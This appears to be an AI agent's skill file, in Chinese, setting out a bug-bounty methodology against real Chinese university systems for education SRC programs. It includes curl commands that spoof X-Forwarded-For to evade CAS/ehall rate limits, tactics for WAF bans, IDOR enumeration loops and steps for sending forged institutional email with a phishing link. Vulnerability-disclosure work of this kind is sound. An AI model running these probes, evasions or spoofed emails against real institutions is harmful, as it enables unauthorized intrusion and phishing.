---
name: education-src-blueprint
description: "教育SRC漏洞挖掘蓝图 — 目标筛选→漏洞类型优先级→利用验证→报告质量门禁→提交决策树。解决'提交即被拒'问题。"
tags: [education, src, butian, quality-gate, blueprint]
---

# 教育SRC漏洞挖掘蓝图 (Education SRC Blueprint)

## 适用场景
- 补天/漏洞盒子教育行业SRC目标
- 批量高校漏洞挖掘
- 提高报告通过率(解决"提交即被拒"问题)

**知识库 / 参考案例**:
- `references/education-small-batch-evidence-gate.md` — 教育 SRC 小批验证与证据门禁规则：先用 `src-hypothesis-builder.py --scope education` 生成角色/对象/假设目录，再用 `src-http-probe.py` 小批探测、`src-evidence-gate.py` 判定 PASS/NEED_MORE/REJECT；包含教育专项停止条件、证据目录、截图位置和不可提交反模式。
- `references/bzuu-rhpt-getappconfig-password-rule-20260524.md` — BZUU 智慧校园 rhpt/Swagger 枚举到公开 `getAppConfig` 泄露统一认证初始密码规则的中危边界案例；强调不要把 Swagger 暴露、受 token 保护的工资/成绩/通讯录接口或未验证账号接管包装成高危。
- `scripts/jtopcms_upload_verify.sh` — JTopCMS/Java CMS `content/multiUpload.do` 未授权上传补充验证脚本：采集后台登录、`commonUtil.js`、无 Cookie TXT/SWF 上传、公网访问、Content-Type 和截图标记证据。
- `scripts/edu-target-preflight.sh` — 目标可达性/基础指纹/低垂果实预检脚本。

**复盘/参考记录** (references/ 目录):
- `references/bzuu-post-go-fastdfs-negative-20260523.md` — 亳州学院 go-fastdfs 已提交后的续挖负证据包：记录 Sangfor SSL VPN `login_auth.csp` 版本/登录初始化、Shibboleth `/idp/shibboleth` 公共元数据、JWXT 登录跳转、oshall/rhptManage 前端配置和 Token 失效、SUDY 空搜索响应、图书馆空配置等不可提交边界；强调同根因 fileServer/status 只补充原报告，不新建重复报告。
- `references/bzuu-zhxyapi-continued-negative-20260523.md` — 亳州学院 go-fastdfs 已提交后的 zhxyApi/网上办事大厅续挖负证据包：记录 `env.js` 暴露 `zhxyApi`/上传接口但核心接口返回 `Token失效`、TTC/Seeyon 候选为 SPA fallback、SUDY/JTopCMS 上传 403、CAS/password reset 标准错误、HCM 附件空 200 等不可提交边界；给出 BZUU 后续新报告硬门槛。
- `references/hljea-vsb-jwwebconsole-negative-20260523.md` — 黑龙江省招生考试院 hljea.org.cn 续挖负证据包：记录 VSB9 静态门户、公开点击计数、访问禁止页、xxcx/JWWebConsoleNew 网上咨询系统连接不稳定边界；强调只有 `pid`/`ksh` 越权读取考生隐私、search SQLi 或认证绕过稳定复现时才提交，不要用 404/000/公开计数/访问禁止凑报告。
- `references/cdp-yikatong-negative-20260526.md` — 成都职业技术学院 CDP yikatong 一卡通前端 JS/API 负证据包；记录 `/static/config/index.js` → `/server`、`index.f4e8ebfd.js` 提取的 user/card/trade/upload/auth/captcha/SMS 路由、小批验证均为失败对象/401/加密失败包装、SM4 解密确认未泄露数据，以及只有低权账号 IDOR、验证码/SMS绕过、公开上传文件、真实 token/交易/卡片数据时才提交。
- `references/cdp-deep-recon-20260523.md` — 成都职业技术学院 CDP 第三轮续挖负证据包：记录 2026-05-23 子域基线、www DWR/WAF 403、yikatong getEncrypt/captcha/user-info/trade/card 挂失失败对象的解密验证、ehall/CAS/aic/jy 间歇超时边界，以及继续投入/提交的明确条件。
- `references/gxdlxy-testing-patterns.md` — 广西电力职业技术学院测试记录：金智CAS DEFAULT_SALT泄露(login.js硬编码)、招聘系统CORS配置不当、WAF拦截actuator/swagger(HTTP 200+访问禁止)、XFF绕过无效
- `references/cust-edu-cn-apereo-cas-findings-20260602.md` — 长春理工大学测试记录：Apereo CAS+PAC4J Open Redirect(无service白名单)、WeChat AppID泄露、致远OA V8.0SP2暴露+CORS、内网IP泄露
- `references/chntheatre-zhongxi-negative-20260527.md` — 中央戏剧学院 chntheatre.edu.cn / zhongxi.cn 深挖负证据包：记录 Fractal Technology 静态CMS、saaswaf.com WAF、APISIX网关+CAS统一认证、Astraeus VPN、CAS密码加密盐值泄露(低危)、ADG-200-11安恒WAF指纹；强调静态CMS攻击面极小，不建议深挖。
- `references/gfxy-education-testing-patterns.md` — 陕西国防工业职业技术学院 gfxy.com 测试记录：通达OA 2025全面认证保护、博达CMS搜索无SQLi、支付平台V5.TF2209.1 ViewState MAC启用、Tomcat/9.0.98版本泄露、100+子域统一403 WAF模式。
- `references/shisu-sisuedu-testing-patterns.md` — 上海外国语大学 shisu.edu.cn 测试记录：escSSO统一认证(JSESSIONID URL泄露+jQuery 1.7.2+OPTIONS暴露TRACE)、SUDY CMS管理后台IP泄露(需区分服务器IP/客户端IP反射)、致远OA Resin/3.1.8、金智教育研究生管理系统(JSONP未授权仅返回hasLogin:false)、Moodle eLearning(webservice需token)、网瑞达WebVPN、200+子域但大量不可达、测试后期IP被WAF封禁。
- `references/hzau-edu-testing-patterns.md` — 华中农业大学 hzau.edu.cn 测试记录
- `references/wisedu-cas-nested-url-open-redirect.md` — wisedu CAS嵌套URL Open Redirect测试模式
- `references/qiyuesuo-cors-vuln-pattern.md` — 契约锁电子签章平台CORS漏洞模式
- `references/njfu-education-testing-patterns.md` — 南京林业大学测试模式：wisedu CAS、ehall JSONP、契约锁CORS、IIS 6.0 WAF模式
- `references/gfxy-education-testing-patterns.md` — 陕西国防工业职业技术学院 gfxy.com 测试记录：通达OA 2025全面认证保护、支付平台V5.TF2209.1 ViewState MAC、100+子域WAF统一403、Tomcat/9.0.98版本泄露：VSB CMS getSession.jsp 4站点确认、ehall SPA版本变体(JSONP API不存在)、WebberRASP WAF按子站独立配置、CSP头泄露内部服务域名/IP、Coremail 403、CAS/SSO不可达。
- `references/chntheatre-negative-evidence-20260527.md` — 中央戏剧学院 chntheatre.edu.cn 负证据包：Fractal Technology 静态CMS、SaaS WAF(CNAME saaswaf.com)、APISIX+WebExp统一认证门户、无登录/上传/API、子域名统一302到登录；记录 auth.zhongxi.cn DNS泄露内网IP、jQuery 1.11.3、webexp API安全配置泄露等低价值发现及停止条件。
## 参考资料

- `references/cqnu-rs-epx-frame-negative-20260526.md` — 重庆师范大学 `rs.cqnu.edu.cn` epx-frame/epxing-frame 招聘服务大厅负证据包；记录 `/js/config.js` 运行态配置、`/epxing-frame/api|process|rule|stream/v1/{client}/{system}/{entityId}/{action}` 拼接规则、FM_SERVICE/FM_USER/FM_FILE/FineReport 候选验证、CORS 无凭证边界，以及无低权账号/fileId/reportlet 前的停止条件。
- `references/cqnu-round4-round5-negative-20260526.md` — 重庆师范大学 CQNU 第四/第五轮外网黑盒续挖负证据包；记录 yscs 找回密码公开配置+CORS、zsxt 招生接口继续负证据、cwcwx v2-api-docs WAF 伪 200、VSB 公开计数 JS、DPtech VPN 登录面、rs.cqnu.edu.cn epx-frame 前端配置/RSA握手公开接口，以及无账号继续投入的停止条件。
- `references/whut-edu-cernet-limited-surface-20260528.md` — 武汉理工大学(211)外网渗透记录：50+子域仅11个外网可达(22%)，Dify chatbot token误报、CAS HttpOnly正确配置、scc 200空body反代拦截模式、网易企业邮DMARC p=none+SPF -all；结论：CERNET高校外网攻击面有限，大部分高价值系统需校内网络。
- `references/cqnu-round3-negative-20260526.md`：CQNU 第三轮教育 SRC 深挖负证据包，覆盖邮件安全、ehall/portal JSONP、财务/一卡通/教务/API、IIS Trace、yscs 找回密码、CAS 状态页等“不建议提交”判断与后续投入条件。


**参考资料** (references/ 目录):
- `references/shupl-webvpn-chaoxing-job-recon.md` — 高校 WebVPN/零信任 Vue 登录、超星智慧门户、ASP.NET WebForms 就业系统的低影响深挖模式与“不建议提交”边界。
- `references/supwisdom-transaction-unauth-statistics.md` — Supwisdom/智慧校园事务中心未授权统计接口模式：从 `admin-platform/serverConfig.json`、融合门户 JS、remoteEntry/import-map 中提取 `transaction.<school>.edu.cn/ttc/`；优先验证 `transactionType/getTransactionTypeList`、`service/monitor/*`、`service/analysis/*` 是否无需登录返回流程配置、业务申请量和 SQL 错误；必须用同系统 `token信息不存在` 接口做鉴权对照，过滤 SPA fallback 和单纯 CORS 反射。
- `references/hunau-wzhd-cors-case.md` — HUNAU 问卷系统 CORS 任意 Origin 反射 + Credentials=true 案例；记录验证边界、截图重点、不可夸大点，以及“可运行脚本路径 + 分区截图输出 + 响应头/体落盘”的复现形态。
- `references/hunau-education-patterns.md` — HUNAU-style education asset notes: CAS under `/cas/login` + CIMS, epxing-frame recruitment portals, WebVPN/internal-DNS leads, CORS interpretation, and a low-impact `curl --resolve` workflow for slow DNS/HTTP targets.

```bash
# 用法
./scripts/edu-target-preflight.sh domain.edu.cn
./scripts/report-quality-gate.sh report.txt
```

## 核心问题诊断 (2026-05-18 实战教训)

### 2026-05 复盘补充：从“检测型”改为“人类渗透假设型”

近期教育 SRC 复盘显示，低效和报告被忽略的主因不是工具不足，而是过度横向枚举、候选长期悬空、以及把“存在”当成“漏洞真实”。教育目标后续默认按以下流程调整：

1. **优先业务入口而非路径字典**：围绕招生查询、教务/成绩、缴费/一卡通、办事大厅、OA/事务中心、文件上传下载、第二课堂、CAS/找回密码、供应商注册等高价值入口建立攻击假设。
2. **先画角色和数据对象**：学生/教师/管理员/供应商/考生/游客；studentId、userId、工号、身份证、手机号、fileId、resId、appId、orgId、tenantId、流程/待办 ID。重点观察这些对象是否由前端传入、是否连续、是否只靠请求头或参数决定权限。
3. **小批低影响验证**：每批最多 20 个接口，单请求 5-8 秒超时，落盘 request/response/meta；长脚本超时或输出截断时立即改为单请求/小批流式复核。
4. **攻击演示优先**：上传类要证明 fileUrl/resId/genName、公网访问和浏览器处理；密钥类要证明可换 token 或调用真实接口；IDOR/未授权要证明不同对象/不同归属；验证码/找回密码要证明存在稳定差异或真实低频发送，不轰炸。
5. **候选归类**：可提交 / 可深挖 / 负证据 / 放弃。Swagger 暴露但接口鉴权正常、Token 失效、公开配置、空响应、SPA fallback、WAF 拦截、同根因重复，默认归为负证据，不写报告。
6. **提交前模拟审核员反驳**：是否公开设计？是否有敏感数据？是否有登录态/无效 token/随机路径/不存在 ID 对照？是否只是强制下载或不解析？如果无法反驳，继续补证或不建议提交。

### 教育SRC“更多的手”执行框架

教育目标默认启用以下工具链，把人类渗透思维拆成多个可验证执行手：

1. **假设生成手**：
   ```bash
   /usr/bin/python3 /root/.hermes/scripts/src-hypothesis-builder.py TARGET --scope education --outdir /tmp/src_TARGET
   ```
   生成教育角色模型（游客/学生/教师/管理员/供应商/考生）、核心对象（studentId/userId/fileId/resId/appId/orgId/tenantId/token）和 7 类假设目录。

2. **JS/API 提取手**：
   使用 `/root/.hermes/scripts/src-js-api-extract.py` 或浏览器运行态，重点提取：招生查询、教务/成绩、缴费/一卡通、办事大厅/OA、第二课堂、CAS/找回密码、文件上传下载、供应商注册、小程序/APP API。

3. **小批探测手**：
   每个假设目录只放 5-20 个高价值 URL 到 `urls.txt`，再执行：
   ```bash
   /usr/bin/python3 /root/.hermes/scripts/src-http-probe.py HYPOTHESIS_DIR HYPOTHESIS_DIR/urls.txt --timeout 8
   ```
   产生 headers/bodies/probe_results.tsv；禁止重新回到无边界大脚本黑洞。

4. **证据门禁手**：
   ```bash
   /usr/bin/python3 /root/.hermes/scripts/src-evidence-gate.py HYPOTHESIS_DIR --out HYPOTHESIS_DIR/evidence_gate.md
   ```
   只有 PASS 或 NEED_MORE 且能补齐证据时继续；REJECT 直接归档为负证据。

5. **报告格式手**：
   报告写完后必须跑 `/root/.hermes/scripts/src-report-format-gate.py` 或等价检查，确认字段、单行 curl、截图位置、实测命令和同根因合并。

### 教育专项停止条件

遇到以下情况立即停止当前分支，不再浪费请求：

- 连续 20 个高价值 API 均为 `Token失效`、401/403、登录页或空数据。
- Swagger/rhpt/ehall/办事大厅只暴露文档或公开配置，无法换 token、无法读敏感数据。
- 上传接口只返回强制下载/不解析文件，且无法证明可信域名攻击载体或信息泄露新根因。
- CORS 仅反射公开接口或无 Credentials/无敏感数据读取。
- CAS/找回密码只有标准错误码，无法低频证明账号枚举、验证码绕过或接管链。
- 邮件安全只有 DMARC/SPF/DKIM 配置缺陷，无实际伪造邮件或账号枚举证据。
- 主站/VSB/SUDY/WordPress 只是公开文章、点击计数、默认公开 REST、SPA fallback。
- 已提交同根因（如 go-fastdfs status/upload、LyWebServer upload、同一事务中心未授权）只能补充原报告，不新建重复报告。

### 教育证据目录硬要求

每个教育候选漏洞必须形成目录：

```
CANDIDATE/
  request.txt
  response.headers
  response.body
  curls.txt
  controls/random_or_invalid.*
  screenshots.txt      # 【截图位置1】入口，【截图位置2】请求，【截图位置3】响应，【截图位置4】攻击结果，【截图位置5】对照
  meta.tsv
  notes.md             # 学校、系统、根因、影响、历史报告/同根因检查
  evidence_gate.md
```

教育 SRC 报告前必须满足：
- 至少一个真实攻击结果：敏感数据、跨对象读取、可用密钥、可访问上传文件、真实低频验证码/枚举差异、SQL/RCE无害证明之一。
- 至少一个对照组：随机路径、无效ID、无效token、未登录/登录态、公开接口差异之一。
- curl/脚本已本机实测，且默认给用户单行 curl 或 bash heredoc，不用反斜杠续行。

### ⚠️ XFF绕过CAS/ehall请求频率限制 (2026-06-01 南京林业大学实战)

当CAS或ehall因请求过多返回空响应(ERR_EMPTY_RESPONSE)时，可用X-Forwarded-For头绕过:
```bash
curl -sk -H "X-Forwarded-For: 10.0.0.1" "https://uia.XXX.edu.cn/authserver/login"
curl -sk -H "X-Forwarded-For: 10.0.0.1" "https://ehall.XXX.edu.cn/jsonp/serviceCenterData.json"
```
- XFF值可以是任意内网IP (10.0.0.1, 127.0.0.1等)
- 不稳定: 大量扫描后可能再次被封禁

### ⚠️ DNS解析到保留IP (198.18.x.x) 检测 (2026-06-01 南京林业大学实战)

部分高校子域(sso/auth/admin/ids/idp/passport)解析到198.18.0.0/15(保留IP段):
```
sso.njfu.edu.cn -> 198.18.1.144
auth.njfu.edu.cn -> 198.18.1.145
admin.njfu.edu.cn -> 198.18.1.146
```
这些是CDN/WAF的DNS劫持或内部DNS配置，非真实服务。不要浪费时间测试这些子域。

**检测方法:**
```bash
for sub in sso auth admin ids idp passport login; do
  ip=$(dig +short ${sub}.XXX.edu.cn A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "${sub}.XXX.edu.cn -> $ip"
done
```
**判定:** 198.18.x.x / 198.19.x.x / 100.64.x.x 均为保留IP，非真实服务。

### 失败案例分析

| 目标 | 漏洞 | 被拒原因 | 根因 |
|------|------|---------|------|
| 亳州学院 | go-fastdfs文件上传 | "文件不解析，危害不足" | 未执行pivot策略，以错误角度提交 |
| 武汉音乐学院 | DMARC缺失 | 配置缺陷不收 | 无实际利用证明，纯DNS检查 |

### ⚠️ 已知低价值模式黑名单 (2026-06-01复盘)

以下发现模式已反复证明教育SRC不收或通过率极低，发现后直接跳过不写报告：

| 黑名单模式 | 出现频率 | 被拒原因 | 正确做法 |
|-----------|---------|---------|---------|
| SUDY CMS admin/login.psp IP泄露 | 几乎每个SUDY站 | 信息泄露，无实质危害 | 跳过 |
| CAS JSESSIONID URL泄露 | 几乎每个CAS站 | 需用户交互，危害不足 | 跳过 |
| CAS pwdDefaultEncryptSalt泄露 | 几乎每个CAS站 | 每会话轮转，无法利用 | 跳过 |
| jQuery旧版本(CVE-2020-11022等) | 广泛存在 | 需配合上传才能利用 | 除非有上传漏洞否则跳过 |
| OPTIONS方法暴露TRACE | 部署默认配置 | XST攻击已被现代浏览器缓解 | 跳过 |
| Spring Boot堆栈跟踪(execution参数) | wisedu CAS通用 | 信息泄露，无实质危害 | 仅作辅助证据 |
| CAS tenant/info配置泄露 | wisedu CAS通用 | 公开设计 | 跳过 |
| robots.txt泄露内网IP | 广泛存在 | 无直接利用价值 | 跳过 |
| X-Application-Context微服务名泄露 | Spring Cloud通用 | 信息泄露 | 跳过 |
| DMARC/SPF缺失(无实际伪造邮件) | 广泛存在 | 配置缺陷不收 | 除非能实际发送伪造邮件 |
| Dify chatbot token前端泄露 | AI系统通用 | 公开设计 | 跳过 |
| 200空body(swagger/.git/druid) | 反向代理统一拦截 | 非真实端点 | 跳过 |

**快速判断规则**: 如果发现的漏洞属于上表黑名单模式，立即停止该分支，转到下一个攻击向量。不要花时间写报告。

### ⚠️ WAF封禁应对策略 (2026-06-01复盘)

当IP被WAF封禁时，按以下优先级处理：

1. **立即转场** (优先): 如果已发现可提交漏洞，直接输出报告并换下一个目标
2. **XFF绕过** (次优先): 部分WAF可用X-Forwarded-For绕过，但仅限初始探测
3. **等待解封** (最次): 通常需要24小时，不建议等待

**不建议的尝试**:
- Tor/proxychains: 教育目标通常不支持，成功率极低
- 找真实IP: 教育目标CDN/WAF通常覆盖所有子域
- 频繁重试: 会延长封禁时间

**封禁阈值**: 通常在发送20-30个请求后触发。关键策略是减少请求数量，提高单请求价值。

### ⚠️ 高价值目标快速识别 (2026-06-01复盘)

每个学校开始测试前，用以下决策树快速定位最高价值目标：

```
侦察阶段(5分钟内):
  ├── ehall.xxx.edu.cn 存在?
  │   └── YES → 测试JSONP API(9个公开端点) → 如有PII泄露 = 中危
  ├── CAS类型?
  │   ├── lyuapServer → 用户枚举(POST /v1/tickets) = 中危
  │   ├── wisedu/ycServer → CORS+堆栈跟踪 = 中危组合
  │   └── 标准Apereo → 盐值/JSESSIONID(低危,跳过)
  ├── 存在API/上传端点?
  │   └── YES → 测试未授权/IDOR = 高危
  ├── LyWebServer CMS?
  │   └── YES → /api/cms/upload未授权 = 严重
  ├── 电子签章平台(契约锁)?
  │   └── YES → CORS = 高危
  └── 以上都没有?
      └── 快速扫描3-5个高价值子域 → 无发现则跳过此目标
```

**关键规则**: 如果5分钟内没有发现P0/P1候选，考虑跳过此目标。不要在低价值目标上花30+分钟。

### ⚠️ 请求效率优化 (2026-06-01复盘)

WAF封禁前的请求预算(~25个)必须用在高价值端点：

**第一梯队** (必须测试, ~10个请求):
1. ehall JSONP: serviceCenterData.json → appIntroduction.json
2. CAS用户枚举: POST /v1/tickets (如lyuapServer)
3. CORS测试: 对最高价值API测Origin反射
4. JS文件分析: 下载主站/ehall的JS提取API

**第二梯队** (如第一梯队有发现, ~10个请求):
5. 深入验证: 遍历appId、测试更多API端点
6. 未授权访问: 对发现的API测认证绕过

**第三梯队** (仅在有明确线索时, ~5个请求):
7. 文件上传、SQLi、认证绕过等

**禁止**: 不要在25个请求预算内测试低价值路径(robots.txt/.git/actuator/swagger/jQuery版本)

### 框架缺陷
1. **无提交前质量门禁** — 发现漏洞就写报告，未验证可接受性
2. **漏洞类型无筛选** — 不知道哪些类型教育SRC收/不收
3. **利用验证缺失** — 只检测不利用，无法提供实际证据
4. **目标选择盲目** — 未检查可达性和WAF，浪费时间在不可访问目标上

### Phase 0.5: JS文件分析 (发现隐藏API端点的关键方法)

**JS文件分析是发现隐藏API端点的最有效方法之一。** 在批量扫描中，通过分析 `common.js` 发现了 LyWebServer CMS 的文件上传API，直接导致发现严重漏洞(CVSS 10.0)。

```bash
# Step 1: 提取页面中的所有JS文件
curl -sk "https://TARGET/" | grep -oP 'src="[^"]*\.js"'

# Step 2: 分析每个JS文件中的API端点
for js in $(curl -sk "https://TARGET/" | grep -oP 'src="\K[^"]*\.js'); do
  echo "=== $js ==="
  curl -sk "https://TARGET/$js" | grep -iE '/api/|upload|captcha|function|ajax|url|endpoint|login|auth'
done

# Step 3: 重点关注的API模式
# - /api/* — RESTful API端点
# - upload/file/attachment — 文件上传功能
# - captcha/verify — 验证码接口
# - login/auth/user — 认证接口
# - admin/manage — 管理接口

# Step 4: 测试发现的API端点
curl -sk "https://TARGET/api/xxx" -D-
```

**实战案例:** lycvc.linyi.cn 的 `common.js` 包含:
- `lyGetCaptchaImage()` → `/api/cms/captchaImage`
- `lyUploadImage()` → `/api/cms/upload?siteId=`
- `hits.js` → `/api/hits/v`

### Phase 0: 目标可达性预检 (5分钟)

**一键快筛脚本 (推荐):**
```bash
/usr/bin/python3 /root/.hermes/scripts/src-fast-assess.py <domain>
# 60秒内输出: 子域名+存活服务+指纹识别+优先攻击面+推荐命令
# 深度模式: src-fast-assess.py <domain> --deep (含nuclei扫描)
```

**指纹→漏洞映射**: 见 `src-vuln-hunting` skill 的 `references/cms-vuln-fingerprint-map.md`
**批量CORS测试**: `/usr/bin/python3 /root/.hermes/scripts/src-cors-batch-test.py <url>`

**手动预检 (备用):**

```bash
#!/bin/bash
# edu-target-preflight.sh — 教育目标可达性预检
DOMAIN="$1"

echo "=== 目标可达性预检: $DOMAIN ==="

# 1. DNS解析
echo "[1] DNS解析..."
IP=$(dig +short "$DOMAIN" A | head -1)
echo "    IP: $IP"

if [ -z "$IP" ]; then
    echo "    [FAIL] DNS解析失败，跳过此目标"
    exit 1
fi

# 2. CERNET检测
echo "[2] CERNET检测..."
WHOIS=$(whois "$IP" 2>/dev/null | grep -i "cernet\|education\|edu" | head -3)
if echo "$WHOIS" | grep -qi "cernet"; then
    echo "    [WARN] CERNET教育网IP，外网可能不可达"
fi

# 3. HTTP可达性
echo "[3] HTTP可达性..."
for proto in https http; do
    CODE=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}" "$proto://$DOMAIN/" 2>/dev/null)
    if [ "$CODE" != "000" ]; then
        echo "    [OK] $proto://$DOMAIN → HTTP $CODE"
        break
    fi
done

if [ "$CODE" = "000" ]; then
    echo "    [FAIL] HTTP不可达，跳过此目标"
    exit 1
fi

# 4. WAF检测
echo "[4] WAF检测..."
WAF_HEADER=$(curl -skI --max-time 8 "https://$DOMAIN/" | grep -iE "x-protected-by|x-waf|server.*waf|acw_tc" | head -1)
if [ -n "$WAF_HEADER" ]; then
    echo "    [WARN] WAF: $WAF_HEADER"
fi

# 5. SPA检测
echo "[5] SPA Fallback检测..."
BODY1=$(curl -sk --max-time 5 "https://$DOMAIN/" | head -c 200)
BODY2=$(curl -sk --max-time 5 "https://$DOMAIN/nonexistent$(date +%s)" | head -c 200)
if [ "$BODY1" = "$BODY2" ]; then
    echo "    [WARN] SPA Fallback — 所有路径返回同一页面"
fi

echo ""
echo "=== 预检完成 ==="
```

### 可达性判定规则
- **HTTP不可达 (000):** 立即跳过，不浪费时间
- **CERNET-only + 不可达:** 跳过主站，转向邮件/DNS/云资产
- **WAF强 (阿里云/腾讯云/360):** 避免actuator/.git/路径遍历，专注API层
- **SaaS WAF (CNAME saaswaf.com):** GET请求正常但POST可能返回403 `ADG-200-11`; 搜索/表单功能可能重定向到外部(如百度site:); 优先测试静态页面和GET接口
- **SPA Fallback:** 避免页面路径测试，专注API路由

## Phase 1: 漏洞类型优先级矩阵

### 教育SRC接受率排序 (从高到低)

| 优先级 | 漏洞类型 | 接受率 | 前提条件 |
|--------|---------|--------|---------|
| P0 | SQL注入 | ★★★★★ | 必须实际执行SQL获取数据 |
| P0 | RCE/命令注入 | ★★★★★ | 必须实际执行命令 |
| P0 | 任意用户登录/认证绕过 | ★★★★★ | 必须实际登录获取数据 |
| P1 | IDOR越权(用户数据) | ★★★★ | 必须遍历获取多个用户数据 |
| P1 | 未授权API(敏感数据) | ★★★★ | 必须返回PII/商业数据 |
| P1 | 文件上传(可执行) | ★★★★ | 必须实际执行(如JSP/PHP解析) |
| P2 | AppSecret/密钥泄露→数据访问 | ★★★ | 必须用密钥实际获取数据 |
| P2 | CORS反射型+凭证窃取 | ★★★ | 必须POC页面+实际窃取token |
| P2 | 邮件伪造(DMARC缺失) | ★★ | 必须实际发送伪造邮件+截图 |
| P3 | 信息泄露(内网IP/版本) | ★ | 仅在可利用时提交 |
| P3 | 配置缺陷(Header缺失) | ★ | 几乎不收 |
| ❌ | go-fastdfs文件上传(不解析) | ✗ | 不收，必须pivot到信息泄露 |
| ❌ | "存在但被拦截" | ✗ | 不收 |
| ❌ | SPA Fallback误报 | ✗ | 不是真实漏洞 |

### 关键规则
1. **P0/P1漏洞**: 直接提交，通过率高
2. **P2漏洞**: 需要完整利用链+实际证据
3. **P3漏洞**: 除非有特殊利用场景，否则不提交
4. **❌类型**: 绝对不提交，浪费时间

## Phase 2: 目标→漏洞类型匹配

### 教育目标常见技术栈→推荐攻击向量

| 技术栈 | 识别特征 | 推荐攻击 | 避免 |
|--------|---------|---------|------|
| CAS/Apereo | /authserver/login | pwdDefaultEncryptSalt泄露, JSESSIONID URL泄露, 用户名枚举(密码找回) | 纯配置缺陷 |
| **CAS/ycServer (wisedu minos)** | /authserver/<theme>/static/, .htl端点, DEFAULT_SALT, _vesi cookie | CORS预检反射, Spring Boot堆栈跟踪泄露, CAS Open Redirect(nested callback), tenant/info配置泄露 | 纯信息泄露(需组合利用) |
| 金智教育(ehall) | ehall.xxx.edu.cn | /jsonp/appIntroduction.json泄露联系人, /jsonp/serviceCenterData.json泄露服务目录 | 已登录才有数据的端点 |
| Spring Boot | /actuator | 如果无WAF: env/heapdump泄露 | 阿里云WAF下actuator |
| go-fastdfs | /fileServer/ | status信息泄露(中危), auth_token | 文件上传角度 |
| Coremail | /coremail/ | 版本泄露, API未授权 | 无数据的配置缺陷 |
| QQ Exmail | mail.xxx.edu.cn | 账号枚举(需无验证码) | DMARC单独提交 |
| 博达CMS | Visual SiteBuilder | SQL注入(如有登录) | 版本泄露 |
| 统一认证 | /authserver/login | 密码加密方式弱点 | 纯配置缺陷 |
| Vue/React SPA | webpack | JS泄露密钥+API路由 | 页面路径测试 |

### 邮件安全审计 (CERNET-only目标的唯一攻击面)

**DMARC缺失不能单独提交！必须组合利用：**

```bash
# 正确的邮件安全报告必须包含：
# 1. DNS检查 (检测)
dig +short _dmarc.target.edu.cn TXT  # 空=缺失
dig +short target.edu.cn TXT | grep spf  # ~all=弱

# 2. 实际伪造邮件发送 (利用)
# 使用自己的SMTP服务器发送伪造邮件
# 收件人: 自己的邮箱
# 发件人: jwc@target.edu.cn (教务处)
# 主题: 关于2026年春季学期成绩查询的通知
# 附件: 钓鱼链接

# 3. 证据截图
# - 伪造邮件在收件箱中显示为"来自 jwc@target.edu.cn"
# - 没有"可疑邮件"警告
# - SPF检查显示 "softfail" 而非 "fail"
```

## Phase 3: 利用验证流程 (提交前必做)

**用户偏好: 先完成全部漏洞挖掘和验证，再输出完整报告。不要边挖边报，不要中途输出未验证的结论。**

### 验证清单

每个漏洞提交前必须通过以下检查：

```
[ ] 1. 漏洞是否实际可触发？(不是理论推断)
[ ] 2. 是否有实际返回数据？(不是"可能泄露")
[ ] 3. 数据是否敏感？(PII/商业数据/凭证)
[ ] 4. 是否有完整HTTP数据包？(请求+响应)
[ ] 5. 是否有可执行的POC？(curl命令/脚本)
[ ] 6. 是否有危害证明？(实际影响范围)
[ ] 7. 漏洞类型是否在教育SRC接受范围内？
[ ] 8. 是否避免了已知被拒类型？
```

### 利用验证模板

```bash
# 验证步骤模板
echo "=== 漏洞验证: [漏洞名称] ==="

# Step 1: 触发漏洞
echo "[1] 触发漏洞..."
curl -sk -D- "[URL]" -H "[Header]" -d "[Body]"
# 记录完整响应

# Step 2: 验证数据
echo "[2] 验证返回数据..."
# 检查是否包含敏感信息
# 检查数据量是否足够证明影响范围

# Step 3: 批量验证
echo "[3] 批量验证影响范围..."
for id in 1 2 3 100 1000; do
    curl -sk "[URL]?id=$id" | grep -c "敏感字段"
done

# Step 4: POC脚本
echo "[4] POC脚本..."
cat > /tmp/poc_[漏洞名].sh << 'EOF'
#!/bin/bash
# POC: [漏洞名称]
# 影响: [具体影响]
curl -sk "[URL]" -H "[Header]"
EOF
chmod +x /tmp/poc_[漏洞名].sh
```

## Phase 4: 报告质量门禁

### 提交前自查清单

```
=== 报告质量门禁 ===

1. 标题格式
   [ ] "xxx站xxx处存在xxx漏洞" (补天标准)
   [ ] 不包含"可钓鱼"/"可利用"等模糊描述

2. 漏洞类型
   [ ] 在教育SRC接受范围内 (P0/P1/P2)
   [ ] 不是已知被拒类型 (❌列表)

3. 复现步骤
   [ ] 每步都有curl命令
   [ ] 每步都有完整响应(请求头+响应头+body)
   [ ] 命令可直接复制执行

4. 证据完整性
   [ ] 有实际返回数据(不是理论推断)
   [ ] 数据已脱敏(手机号/身份证部分隐藏)
   [ ] 有数据量证明(如"遍历获取1000条记录")

5. 危害证明
   [ ] 具体描述能获取/操作什么
   [ ] 有影响范围(如"影响全校3万学生")
   [ ] 有攻击场景(如"攻击者可获取任意学生成绩")

6. 格式要求
   [ ] 纯文本(不用HTML)
   [ ] 地址精确到区(如"安徽省亳州市谯城区")
   [ ] CVSS向量字符串
   [ ] 行业分类正确

7. 避免的陷阱
   [ ] 不是SPA Fallback误报
   [ ] 不是"存在但被拦截"
   [ ] 不是配置缺陷(除非有实际利用)
   [ ] 不是go-fastdfs文件上传角度
```

### 报告模板 (教育SRC标准)

```
============================================================
漏洞报告
============================================================

标题: [学校名][系统名]存在[漏洞类型]漏洞[简述危害]

域名: [漏洞所在域名]

漏洞类型: [SQL注入/未授权访问/信息泄露/...]

漏洞等级: [严重/高危/中危/低危]

行业: 教育

地址: [省][市][区] (精确到区)

漏洞URL: [完整URL含参数]

漏洞详情:
[2-3句话描述漏洞本质和影响]

复现步骤:
1. [步骤1]
   curl命令: curl -sk -D- "[URL]" -H "[Header]"
   响应: [完整响应头+关键body]

2. [步骤2]
   curl命令: curl -sk "[URL2]"
   响应: [完整响应]

3. [步骤3]
   [验证结果]

影响:
[具体危害: 能获取什么数据, 影响多少用户, 攻击场景]

修复建议:
1. [具体修复方案1]
2. [具体修复方案2]

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N → 9.1
```

## Phase 5: 决策树

```
发现潜在漏洞
    ↓
[是否P0/P1类型?] → 是 → 直接利用验证 → 提交
    ↓ 否
[是否P2类型?] → 是 → 检查是否有完整利用链
    ↓                    ↓ 有 → 利用验证 → 提交
    ↓                    ↓ 无 → 跳过或尝试深入利用
    ↓ 否
[是否P3/❌类型?] → 是 → 跳过，不浪费时间
    ↓ 否
